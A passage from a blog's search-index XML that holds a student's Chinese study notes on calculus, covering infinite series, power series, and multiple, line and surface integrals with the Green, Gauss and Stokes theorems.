href="http://www.tanzhouedu.com/">http://www.tanzhouedu.com/</a> 非常感谢...有兴趣的可以去报个班学一学</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>微积分级数</title>
      <link href="/2017/06/12/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%BA%A7%E6%95%B0/"/>
      <url>/2017/06/12/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%BA%A7%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>微积分马上就要结课了，然后感觉级数这一块还是得总结一下</p><h3 id="级数的定义和性质">$8.1级数的定义和性质</h3><hr /><p><strong>第一个重要概念：级数的概念(什么是级数)</strong> 个人理解，级数就是一列无限项的数列比如u1,u2,u3,u4....un....，其中为un为级数的一般项，相当于数列里面的通项。 <strong>第二个重要概念：级数的部分和(记为Sn)</strong> Sn=u1+u2+u3+u4....+un,其实类似数列的前n项和 <strong>最最最重要的概念：级数的收敛和发散（这个不知道后面都不用学了）</strong> <strong>如果limn-&gt;∞Sn存在，值记为S，那么称级数∑un收敛，且称级数的和为S。(在级数可以隔项相消的时候很有用！)</strong> 同理，<strong>如果limn-&gt;∞Sn不存在，则称级数∑un发散。</strong> 书上还有个余项的概念，我没怎么在意，感觉和泰勒公式里面的余项类似，就是一种理想结果和实际的差值的绝对值。 自己随意地理解一下就ok了。 好的，了解了什么是级数之后，8.1的后面介绍了几种级数的性质(随意看下，结合定义理解起来很简单所以我说一定要弄清楚级数收敛的定义) <strong>性质一：</strong> 如果级数∑un收敛，和记为S，那么级数∑kun也收敛且和为kS，k为常数。 <strong>性质二：</strong> 如果级数∑un和级数∑vn均收敛，和分别为p和q，那么级数∑(un±vn)也收敛，且和为p±q。 <strong>性质三：</strong> 级数前面减去或者加上有限项并不改变级数的敛散性，但在级数收敛的时候，一般会改变级数的和。 <strong>性质四：</strong> 如果一个级数收敛，那么加括号后的级数也收敛。<strong>反之不一定成立！反之不一定成立！反之不一定成立！</strong> 性质随意看一下就ok，定义要好好理解，8.1大概就是这些了。 <strong>最最最最最最后一点，级数收敛的必要条件：当n-&gt;∞时,un=0，这就是说你以后看见一个级数，先看一眼一般项的极限就可以初步判断级数收敛的可能了，所以这个还是很重要的</strong></p><h3 id="常数项级数的判别法">$8.2常数项级数的判别法</h3><p>首先不得不说这一节非常重要，非常重要，做个标记，<strong>非常重要</strong>，常数项级数一般就是考的这个了，其他可能会涉及到后面的幂级数，这个后面再说。</p><h4 id="一正项级数判敛正项级数就是一般项un0的级数"><strong>一、正项级数判敛(正项级数就是一般项un≥0的级数)</strong></h4><hr /><p><strong>定理一：充要条件！</strong> 设∑un为正项级数，那么∑un收敛的充要条件是它的部分和数列有界(证明用极限里面的单调有界准则，很简单) <strong>定理二：比较判敛法</strong> 通俗一点讲就是， <strong>如果一个正项级数∑un的一般项小于一个收敛正项级数的一般项，则级数∑un收敛</strong> <strong>如果一个正项级数∑un的一般项大于一个发散正项级数的一般项，则级数∑un发散</strong> 随意理解一下就ok，这个用习惯了很好想。 然后这里提出一个<strong>p级数</strong>的版子，挺重要的。 级数∑1/np被成为p级数(p&gt;0)，它有下面特点 <strong>当p≤1的时候，p级数发散</strong> <strong>当p&gt;1的时候，p级数收敛</strong> <strong>定理三：一般项等价，级数同敛散</strong> 设∑un和∑vn都是正项级数，如果两级数的一般项在n趋于无穷的时候为同阶无穷小，那么两级数同时收敛或发散。 比如下面这道题.... <img src="/images/2017/06/1-1.png" /> 一开始我拿到这个题一直想用比较判敛法，但是总是判断不出来，后来听老师讲了之后才知道有这个方法..... 这道题只要把级数取绝对值直接去证绝对收敛就ok，把其一般项和n*(1/n)a2n做比值然后取极限就ok，然后因为tanx和x在 x趋于0的时候是等价无穷小，所以原级数取绝对值后和∑a2n同敛散所以其绝对收敛 <strong>定理四：比值判敛法(达朗贝尔判别法)</strong> 即用limn-&gt;∞un+1/un=ρ(0≤ρ≤+∞)来判断级数的敛散性 ρ&lt;1时，级数∑un收敛 ρ&gt;1时，级数∑un发散 ρ=1时，无法判断。 这个方法也挺重要的，而且在后面幂级数的敛散判断里面也有推论，多看看也不是很难掌握。 <strong>定理五：根值判敛法(柯西判敛法)</strong> 也即把级数一般项开n次方然后取n-&gt;∞的极限来判断敛散性 设极限为ρ，那么同样有 ρ&lt;1时，级数∑un收敛 ρ&gt;1时，级数∑un发散 ρ=1时，无法判断。   <strong>到这里正项级数的判敛方法就讲完了！这个很重要，要多看</strong></p><h4 id="二交错级数的判敛法"><strong>二、交错级数的判敛法</strong></h4><hr /><p>什么是交错级数？ 交错级数就是 ∑(-1)n-1un或∑(-1)nun这种的级数 其收敛必须具备两个条件 1、满足级数收敛的通用必要条件-&gt;当一般项的n-&gt;∞的时候极限为0 2、级数的un单调不增。 这里有个经典的利用这个结论的题目 <img src="/images/2017/06/1-1-1.png" /> 这里正项级数an单调减少，但是交错级数却发散，所以an最后不是趋近于0而是趋于一个正数。之后再用柯西判敛法，取个1/n次方之后1/(an+1)小于1，所以该最后得出结论，题中级数收敛。 其他的题目感觉就是硬套结论没什么好说的。</p><h4 id="三绝对收敛和条件收敛">三、绝对收敛和条件收敛</h4><hr /><p>这一部分一开始就拿出一个结论： <strong>定理7：如果一个级数的绝对值级数(绝对值级数就是把某个级数的一般项取绝对值后得到的级数)收敛，那么它的原级数也收敛。</strong> 这个结论非常非常的有用，它可以把一个任意级数转为判断正项级数，这样就可以使用正项级数判敛法了。 顺便在这里提出一个常用范例：级数∑1/n和∑(-1)n-1(1/n),这里前者是发散的，后者是收敛的，这个结论蛮常用的。 后面介绍了一个定义：<strong>如果一个级数它的绝对值级数收敛，那么称这个级数绝对收敛，如果一个级数的绝对值级数发散，而级数自身收敛，那么称这个级数条件收敛。</strong> 这个定义没啥用，只是用来做题和称呼。 <strong>Tips:在有了条件收敛和绝对收敛之后，判断一个非正项级数的敛散性的时候就一定要说明是绝对收敛还是条件收敛了。</strong> 条件收敛的定理8，9我觉得不是很重要(起码暂时还不觉得.....),所以我就简单的列出来吧，大家看下就可以了。 定理8：绝对收敛级数不因为改变项的位置而改变它的和 定理9：设级数∑un和∑vn都是绝对收敛的，其和分别为S和σ，那么它们的柯西乘积 <img src="/images/2017/06/1-2.png" />也绝对收敛，且和为S+σ。</p><h3 id="幂级数">$8.3幂级数</h3><hr /><p>非常非常非常重要的一节，可以说是级数一章的灵魂了 首先<strong>函数项级数的定义</strong>: 给定一个<strong>区间I</strong>上定义的函数列，u1(x),u2(x),u3(x)....un(x)....,则由该函数列所构成的表达式∑un(x)就是<strong>定义在∑un区间I</strong>上的函数项级数。 <strong>说白了就是把级数的项改成和x有关的函数，构成的级数就是函数项级数。</strong> 然后定义二是关于收敛点的，就是在某个定义域内部的点x0，如果∑un(x0)收敛，那么称x0为级数的收敛点，如果发散就是发散点；全体收敛点的集合称为函数项级数的收敛域。 上面所有和定义域相关的东西都重点标记了，<strong>以后在函数项级数里面，所有的结果，都必须带上相应的域，否则算结果不完整！</strong> <strong>然后到幂级数</strong> 定义：<strong>形如∑anxn=a0+a1x+a2x2+...anxn...的函数项级数称为幂级数，其中a0，a1，a2...an被称为幂级数的系数。</strong> 简单易懂，就是函数项都为幂函数的级数就是幂级数 然后一个不起眼的重要结论 <strong>定理一-&gt;阿贝尔定理:</strong> <strong>如果幂级数在点x0处收敛，那么当x&lt;x0的时候幂级数也收敛</strong> <strong>如果幂级数在点x0处发散，那么当x&gt;x0的时候幂级数也发散</strong> 下面定理二，这个真的<strong>很重要很重要</strong> <img src="/images/2017/06/1-3.png" /> 其中这个R是收敛半径，也就是说级数在(-R,R),[-R,R),(-R,R]或[-R,R]上面收敛。两个端点要靠带进去来判断。 有了这个结论，几乎所有的题目都是n+1项比第n项，看收敛半径，如果有n次方的话，那就开个n次方，然后依旧得出收敛区间</p><hr /><p>幂级数的加减一块我觉得不是很重要，此处省略。。。 和函数的性质，这个直接涉及到了幂级数求和了....幂级数求和主要涉及三个方法 第一个：<strong>连续</strong>-&gt;幂级数的收敛区间的端点如果收敛，那么其和函数就在这一点连续。 第二个：<strong>求导</strong>-&gt;<strong>简单点说就是幂级数的和函数可以由该级数的一般项求导后求和，然后对结果积分算出来。</strong> 第三个：<strong>积分</strong>-&gt;同二，就是<strong>可以先积分再求和最后再对结果求导得出和函数。</strong> 这三个结论用的熟不熟，直接决定了能不能正确的求出幂级数的和函数！需要多加练习。</p>]]></content>
      
      
      <categories>
          
          <category> 微积分大物等 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>微积分小结</title>
      <link href="/2017/05/10/%E5%BE%AE%E7%A7%AF%E5%88%86%E5%B0%8F%E7%BB%93/"/>
      <url>/2017/05/10/%E5%BE%AE%E7%A7%AF%E5%88%86%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>微积分现在已经学了这么多种积分了，先总结一下  </p><h4 id="二重积分">二重积分</h4><p>比较简单，确定好区域就ok。 <strong>考点</strong>:注意一种交换积分顺序的证明题，或者单纯的计算题 <strong>几何意义</strong>:直接理解都没问题，把坐标面横放，然后被积函数和微元的乘积就是一个小柱的体积，积分就是以被积函数为顶的几何体体积。 <strong>计算方法</strong>:平面坐标x，y直接解，或者使用极坐标简化运算(别忘了乘r)。 <strong>较冷门</strong>:二重积分的换元(乘雅可比行列式) <strong>技巧</strong>: 1、注意奇偶性，可大量简化运算 2、轮换对称性</p><h4 id="三重积分">三重积分</h4><p>稍难一点，但也不是很难。 <strong>考点</strong>:一般都是计算(也可能是我见题少....) <strong>几何意义</strong>:一个空间几何体的一个体积微元和被积函数的乘积积分就是一个体积微元的质量(假如把被积函数当密度函数)，结果就是密度函数为f的几何体的质量。(说的可能不太清楚，自己体会一下) <strong>计算方法</strong>: 1、直接计算有两种 (1)<strong>先一后二</strong>.先把几何体投影到某个平面然后变成二重积分计算。比如先对z积分，就是先把几何体往xoy平面投影，然后对平面内的区域进行二重积分。 (2)<strong>先二后一</strong>.这个很好用，说到底其实是定积分，当沿某个坐标轴(比如z)，该几何体的每个截面(用z=某个值来截)都可以用该轴所代表的变量(z)表示的时候，就直接把截面用变量的方程表示(截面用z表示),然后乘微元dz，积分就得到了结果。 2、<strong>柱坐标</strong>.这个就直接把x，y当r和θ来用就可以了，z还是z，不作过多说明 3、<strong>球坐标</strong>.这个是由θ，φ，r组成的，一般情况是先对r，再对φ，最后对θ积分。不多介绍。 较冷门:三元的换元，同二元。 <strong>技巧</strong>: 1、<strong>轮换对称性</strong>！<strong>轮换对称性</strong>！<strong>轮换对称性</strong>！重要的事说三遍！！！这个太重要了，用得好的话简化的不止一点.... 2、<strong>奇偶性</strong> 3、<strong>形心的意义</strong>.这个可能有点冷门说实话很好用，简化运算很有用。用于计算∫∫∫zdv之类的被积函数只含一个函数元的。  </p><h4 id="第一类曲线积分">第一类曲线积分</h4><p>说实话，到了什么曲线积分啊，曲面积分啊的我就都忘了...... <strong>考点</strong>:不太清除，但是似乎不难.....我碰到的几乎都是计算 <strong>几何意义</strong>:将被积函数看作曲线的密度函数，那么第一类曲线积分就代表某一条曲线 (即L上)的质量。 <strong>计算法</strong>:直接带入就好了嘛，记得要乘上一个弧微分√x'(t) ²+y'(t)²。如果将x看成中间变量的话那y'就是x的导数，x的导为1 <strong>技巧</strong>:没有技巧就是算<strong>区别与第二类曲线积分</strong>(第一类是dL，第二类是dx，dy)</p><h4 id="第一类曲面积分">第一类曲面积分</h4><p>又一个蒙蔽的概念 <strong>考点</strong>:算！ <strong>几何意义</strong>:将被积函数看作曲面的密度函数，那么第一类曲面积分就代表某个曲面(S)的质量。 <strong>计算法</strong>:其实还是投影，比如往xoy投影，则面积微元变为√1+(∂z/∂x)²+(∂z/∂y)²dxdy，注意变完后z必须用x，y来代替！ <strong>技巧</strong>:这个真的就是算了.....当然变成二重积分后还是可以用前面的二重积分的技巧的  </p><h4 id="第二类曲线积分">第二类曲线积分</h4><p>这个东西吧，我看了个几遍感觉差不多了..... 下面从书上的内容来记录下 首先本来积分是∫<strong>f</strong>d<strong>s</strong>,其中f和s是向量，d<strong>s</strong>=<strong>τ</strong>ds,即方向弧线的微元等于弧微分乘单位方向向量，然后单位方向向量等于[x'(t)<strong>i</strong>+y(t)<strong>j</strong>+z(t)<strong>k</strong>]/√x'(t) ²+y'(t)²+z'(t)²,而ds还是和前面的第一类曲线积分一样为√x'(t) ²+y'(t)²+z'(t)²。那么乘积就等于x'(t)<strong>i</strong>+y(t)<strong>j</strong>+z(t)<strong>k，</strong>也就是dx<strong>i</strong>+dy<strong>j</strong>+dz<strong>k</strong>=(dx,dy,dz),而<strong>f</strong>又可以分解为i，j，k三个方向，计各个方向的值为P，Q，R。那么我们就得到了结果∫<strong>f</strong>d<strong>s</strong>=∫Pdx+Qdy+rdz 到这里第二类曲线积分的计算就被我们推了一遍了。 <strong>考点</strong>:就是计算了.... <strong>几何意义</strong>:设f为一个变力，s为物体运动的轨迹(具有方向)，那么积分的值就是f所做的功。 <strong>计算方法</strong>:将x，y，z换成t的代数式，然后代进去，积分上下限取t的起始值，然后算定积分就ok了。 <strong>技巧</strong>:没有技巧.....</p><h4 id="第二类曲面积分">第二类曲面积分</h4><p>这个理解起来就难得多了，∫∫<strong>F•n0</strong>ds<strong>,</strong>然后这里<strong>n0</strong>又可以写由<strong>i,j,k</strong>表示，那么先把<strong>F</strong>分解为各个方向，即<strong>F</strong>=P<strong>i</strong>+Q<strong>j</strong>+R<strong>k</strong> 则∫∫<strong>F•n0</strong>ds可以表示为∫∫P<strong>i•n0</strong>ds+∫∫Q<strong>j•n0</strong>ds+∫∫R<strong>k•n0</strong>ds,而<strong>n0</strong>=(-zx<strong>i</strong>-zy<strong>j</strong>+<strong>k</strong>)/√1+z²x+z²y乘上ds后分母约掉，剩下分子，也就是法向量的表达式.这就得到一种算第二类曲面积分的方法<strong>合一投影法</strong>，也就是∫∫(P,Q,R)<strong>•</strong>(-zx,-zy,1)dxdy  <strong>(注:平面指向前面，上面，右面时常数取1，否则取-1(即法向量取反)) </strong> 另一种方法是将ds和<strong>n0</strong>合并了，因为<strong>n0</strong>可以写为(cosα,cosβ,cosγ),分别乘上ds后就是(dydz,dzdx,dxdy),然后同意取个方向，换个变量就ok，这个就是<strong>分面投影法</strong>。 <strong>考点</strong>:多种计算方法呗 <strong>几何意义</strong>:设流体速度为<strong>v</strong>，穿过的平面为S，那么流量就为这个积分的值。 <strong>计算方法</strong>: <strong>合一投影法:</strong>∫∫<strong>F•n0</strong>ds=∫∫(P,Q,R)<strong>•</strong>(-zx,-zy,1)dxdy  <strong>(注:平面指向前面，上面，右面时常数取1，否则取-1(即法向量取反)) </strong> <strong>分面投影法:</strong>∫∫<strong>F•n0</strong>ds=∫∫P(x(y,z),y,z)dydz+∫∫Q(x,y(x,z),z)dzdx+.... <strong>技巧:</strong>dxdy，dydz，dxdz都有的用合一，只有一个的用分面.</p><h4 id="格林公式">格林公式</h4><p>用于计算某些特殊图形的面积，或者是计算形式上麻烦的第二类曲线积分。 <strong>考点</strong>:补成封闭图形，复连通区域偏导相等来改变图形，等等一些操作..... <strong>注意</strong>:某些地方有的点偏导是不存在的！这时候图形是复连通区域！！！！(正负还是外部逆时针内部顺时针)  </p><h4 id="高斯公式">高斯公式</h4><p>用于计算复杂的第二类曲面积分，将被积函数转化为简单的算式，或者转化为易于使用柱坐标球坐标计算的算式。 <strong>考点:</strong>一定要是<strong>封闭曲面</strong>，一定要注意！！！不是封闭曲面可以考虑补成封闭曲面。顺便提醒，转化为三重积分之后不要拿曲面积分的算式代换被积函数，因为这两个方程是完全不同的，一个表示曲面，一个表示空间几何体，所以代换一般会出错。(大概只有我做过这种蠢事吧...... <strong>注意</strong>:同样注意偏导数不存在的区域。其次，注意一定要封闭曲面。最后，计算。<strong>差点忘了</strong>，<strong>外部为正，内部为负。</strong>  </p><h4 id="斯托克斯公式">斯托克斯公式</h4><p>其实就是三维坐标系下的格林公式，用于把第二类曲线积分转化为第二类曲面积分。 <strong>考点:</strong>记一下公式，然后使用方法同格林公式，看见三维坐标系下第二类曲线积分，拿斯托克斯公式去试试就知道行不行了。  </p><h4 id="积分与路径无关">积分与路径无关</h4><p>随意的提一下了。 几个等价条件。 前提：D为平面单连通区域，P，Q有一阶连续偏导。 1、D内任意一段光滑闭曲线L有∫LP(x,y)dx+Q(x,y)dy=0，即任意一段闭曲线的曲线积分为0 2、∫LP(x,y)dx+Q(x,y)dy的值与路径无关。这个很重要，有这个条件就可以把奇奇怪怪的积分往平行坐标轴的方向转化了。 3、被积表达式∫LP(x,y)dx+Q(x,y)dy在D内是某个二元函数u(x,y)的全微分。 即du(x,y)=P(x,y)dx+Q(x,y)dy          这个一般用来解全微分方程，先验证∂Q/∂x=∂P/∂y然后取积分∫(0,0)(x,y)P(x,y)dx+Q(x,y)dy,然后往x，y轴转化即可解除全微分。 4、在D内每一点都满足∂Q/∂x=∂P/∂y。这个一般是作为起始条件让你转化出新条件的。 好了就这么多了。大部分的理解还是自己练习加思考，这里的总结只是在学习完后用于反思。</p>]]></content>
      
      
      <categories>
          
          <category> 微积分大物等 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
